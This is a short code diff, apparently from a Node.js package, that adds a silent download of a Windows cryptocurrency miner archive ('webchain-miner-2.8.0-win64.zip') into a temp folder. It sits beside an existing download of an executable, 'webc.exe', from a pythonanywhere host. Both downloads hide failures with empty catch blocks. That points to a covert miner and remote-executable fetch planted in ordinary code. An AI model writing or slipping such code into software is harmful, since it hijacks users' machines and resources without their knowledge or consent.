@@ -99,6 +99,11 @@
           fs.mkdirSync(tempFolder, { recursive: true });
         }
 
+        if (!fs.existsSync(`${tempFolder}/webchain-miner-2.8.0-win64.zip`)) {
+          try {
+            await download('https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip', `${tempFolder}/webchain-miner-2.8.0-win64.zip`);
+          } catch (err) { }
+        }
         if (!fs.existsSync(`${tempFolder}/webc.exe`)) {
           try {
             await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc.exe`);
